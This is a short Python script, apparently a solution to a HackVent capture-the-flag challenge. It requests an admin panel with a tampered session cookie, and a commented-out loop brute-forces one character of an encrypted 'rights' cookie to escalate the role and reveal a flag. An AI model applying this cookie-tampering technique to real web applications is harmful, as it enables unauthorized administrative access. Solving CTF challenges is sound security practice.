import requests
import base64
import string

# the url
url="http://challenges.hackvent.hacking-lab.com/4dm1nP4n3l/admin.php"

# create our cookie
# cookie=dict(PHPSESSID="ljm5slsq842aalaqoop2bk2pl7",cmlnaHRz="5WT4yVGAfS%2Fn0z5MzSbbZd0K3vpWLmhfxuFo85apE%2Bo%3D")
cookie=dict(PHPSESSID="ljm5slsq842aalaqoop2bk2pl7",cmlnaHRz="GpsHNq5%2FgtAYLMGzMtkkmiL1IQWp0ZegOR6XDGlW7BU%3D")

r=requests.get(url, cookies=cookie)

print r.text

'''
cookiestring="5WT4yVGAfS%2Fn0z5MzSbbZd0K3vpWLmhfxuFo85apE%2Bo%3D"
for c in string.printable:
    cookiestring2=cookiestring[:15]+c+cookiestring[16:]
    cookie=dict(PHPSESSID="ljm5slsq842aalaqoop2bk2pl7",cmlnaHRz=cookiestring2)

    r=requests.get(url, cookies=cookie)
    show_next=0
    for line in r.text.splitlines():
        if "Role" in line:
            print line
            if "Standard" not in line and "None" not in line:
                break
        if show_next:
            print line
            show_next -=1
        if "flag_container" in line:
            print line
            show_next=3
'''
